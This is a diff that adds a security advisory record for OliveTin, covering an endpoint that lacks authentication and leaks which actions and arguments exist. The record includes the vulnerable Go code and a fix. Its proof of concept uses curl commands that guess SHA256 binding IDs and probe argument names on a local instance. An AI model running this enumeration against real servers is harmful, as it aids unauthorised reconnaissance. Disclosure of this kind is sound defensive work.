@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-f637-w7p2-m7fx",
+  "modified": "2026-06-24T17:45:07.432181701Z",
+  "published": "2026-06-24T17:41:01Z",
+  "aliases": [
+    "CVE-2026-48709"
+  ],
+  "summary": "OliveTin: ValidateArgumentType API Endpoint's Missing Authentication Allows Action and Argument Enumeration",
+  "details": "## Summary\n\nThe `ValidateArgumentType` RPC endpoint in `service/internal/api/api.go` does not perform any authentication or authorization checks. Unlike all other data-returning API endpoints, it does not call `auth.UserFromApiCall` or `checkDashboardAccess`. When `AuthRequireGuestsToLogin` is enabled (the security-conscious configuration), this endpoint remains accessible to unauthenticated users and can be used as an oracle to enumerate valid action binding IDs and their argument configurations.\n\n## Details\n\n### Root Cause\n\nThe `ValidateArgumentType` handler at `service/internal/api/api.go:726` has no authentication check:\n\n```go\nfunc (api *oliveTinAPI) ValidateArgumentType(ctx ctx.Context, req *connect.Request[apiv1.ValidateArgumentTypeRequest]) (*connect.Response[apiv1.ValidateArgumentTypeResponse], error) {\n    if api.argumentNotFoundForValidation(req.Msg) {\n        return nil, connect.NewError(connect.CodeNotFound, fmt.Errorf(\"action or argument not found for binding ID %s\", req.Msg.BindingId))\n    }\n\n    err := api.validateArgumentTypeInternal(req.Msg)\n    desc := \"\"\n    if err != nil {\n        desc = err.Error()\n    }\n\n    return connect.NewResponse(\u0026apiv1.ValidateArgumentTypeResponse{\n        Valid:       err == nil,\n        Description: desc,\n    }), nil\n}\n```\n\nCompare this with adjacent endpoints that DO have auth checks:\n\n```go\n// WhoAmI - has auth check\nfunc (api *oliveTinAPI) WhoAmI(ctx ctx.Context, req *connect.Request[apiv1.WhoAmIRequest]) ... {\n    user := auth.UserFromApiCall(ctx, req, api.cfg)\n    if err := api.checkDashboardAccess(user); err != nil {\n        return nil, err\n    }\n    ...\n}\n\n// GetDashboard - has auth check\nfunc (api *oliveTinAPI) GetDashboard(ctx ctx.Context, req *connect.Request[apiv1.GetDashboardRequest]) ... {\n    user := auth.UserFromApiCall(ctx, req, api.cfg)\n    if err := api.checkDashboardAccess(user); err != nil {\n        return nil, err\n    }\n    ...\n}\n```\n\n### Oracle Behavior\n\nThe endpoint provides different responses based on whether the binding and argument exist:\n\n- **Valid binding + valid argument**: Returns `{valid: true/false, description: \"...\"}` (200 OK)\n\n- **Valid binding + invalid argument**: Returns `CodeNotFound` error\n\n- **Invalid binding**: Returns `CodeNotFound` error\n\nWhile the error messages for the last two cases are identical, an attacker who knows a valid binding ID (or can guess one from action title SHA256) can enumerate argument names by observing which ones return 200 OK vs CodeNotFound.\n\n\n\n\n\n\n\n\n\n### Binding ID Predictability\n\nBinding IDs are SHA256 hashes of action titles (see `service/internal/executor/executor_actions.go`). Since action titles are typically short, human-readable strings (e.g., \"Ping\", \"Restart Service\", \"Deploy\"), an attacker can precompute hashes of likely titles and test them against this endpoint.\n\n### Scope\nThis finding is only meaningful when `AuthRequireGuestsToLogin: true` is configured. In the default configuration where guests have full dashboard access, the action information is already visible through the dashboard API.\nWhen `AuthRequireGuestsToLogin` is true, `checkDashboardAccess` blocks guest access to other endpoints but NOT to `ValidateArgumentType`.\n\n## PoC\n\n### Prerequisites\n\n- OliveTin instance with `AuthRequireGuestsToLogin: true` configured\n\n### Step 1: Verify other endpoints require auth\n\nConfirm that regular endpoints reject unauthenticated requests:\n\n```bash\ncurl -s -X POST http://localhost:1337/api/GetDashboard \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{}\"\n# Returns: CodePermissionDenied - \"guests are not allowed to access the dashboard\"\n```\n\n### Step 2: Enumerate binding IDs via ValidateArgumentType\n\nTest candidate binding IDs (SHA256 of guessed action titles):\n\n```bash\n# Test if an action titled \"Ping\" exists\nBINDING_ID=$(echo -n \"Ping\" | sha256sum | cut -d\" \" -f1)\ncurl -s -X POST http://localhost:1337/api/ValidateArgumentType \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\\\"bindingId\\\":\\\"$BINDING_ID\\\",\\\"argumentName\\\":\\\"test\\\",\\\"value\\\":\\\"x\\\",\\\"type\\\":\\\"ascii\\\"}\"\n# If action exists: returns CodeNotFound (argument \"test\" not found for this binding)\n# If action does not exist: returns CodeNotFound (same message, but confirms the oracle)\n```\n\n### Step 3: Enumerate argument names for a known binding\n\nOnce a valid binding ID is known, brute-force argument names:\n\n```bash\n# Test if argument \"target\" exists for the Ping action\ncurl -s -X POST http://localhost:1337/api/ValidateArgumentType \\\n  -H \"Content-Type: application/json\" \\\n  -d \"{\\\"bindingId\\\":\\\"$BINDING_ID\\\",\\\"argumentName\\\":\\\"target\\\",\\\"value\\\":\\\"test\\\",\\\"type\\\":\\\"ascii\\\"}\"\n# If argument exists: returns {valid: true/false} (200 OK) -- CONFIRMED\n# If argument does not exist: returns CodeNotFound error\n```\n\n## Impact\n\n1. **Information Disclosure**: Unauthenticated users can enumerate which actions exist (by testing binding IDs) and which arguments each action accepts (by testing argument names). This reveals the server configuration to unauthorized parties.\n\n2. **Reconnaissance for Further Attacks**: The enumerated information (action names, argument names, argument types) provides valuable reconnaissance for more targeted attacks such as the `ot_` prefix argument injection (see advisory 001) or social engineering.\n\n3. **Limited Scope**: This is only exploitable when `AuthRequireGuestsToLogin: true` is configured. In the default configuration, guests already have full access to the dashboard which exposes the same information.\n\n## Recommended Fix\n\nAdd authentication and dashboard access checks to the `ValidateArgumentType` handler, consistent with all other data-returning endpoints:\n\n```go\nfunc (api *oliveTinAPI) ValidateArgumentType(ctx ctx.Context, req *connect.Request[apiv1.ValidateArgumentTypeRequest]) (*connect.Response[apiv1.ValidateArgumentTypeResponse], error) {\n    // Add auth check consistent with other endpoints\n    user := auth.UserFromApiCall(ctx, req, api.cfg)\n    if err := api.checkDashboardAccess(user); err != nil {\n        return nil, err\n    }\n\n    if api.argumentNotFoundForValidation(req.Msg) {\n        return nil, connect.NewError(connect.CodeNotFound, fmt.Errorf(\"action or argument not found for binding ID %s\", req.Msg.BindingId))\n    }\n\n    err := api.validateArgumentTypeInternal(req.Msg)\n    desc := \"\"\n    if err != nil {\n        desc = err.Error()\n    }\n\n    return connect.NewResponse(\u0026apiv1.ValidateArgumentTypeResponse{\n        Valid:       err == nil,\n        Description: desc,\n    }), nil\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/OliveTin/OliveTin",
+        "purl": "pkg:golang/github.com/OliveTin/OliveTin"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20260521230847-a3865704c854"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-f637-w7p2-m7fx/GHSA-f637-w7p2-m7fx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/OliveTin/OliveTin/security/advisories/GHSA-f637-w7p2-m7fx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48709"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/OliveTin/OliveTin/commit/a3865704c854061452a4ab5f6d95de3312698ccd"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/OliveTin/OliveTin"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/OliveTin/OliveTin/releases/tag/3000.13.0"
+    }
+  ]
+}
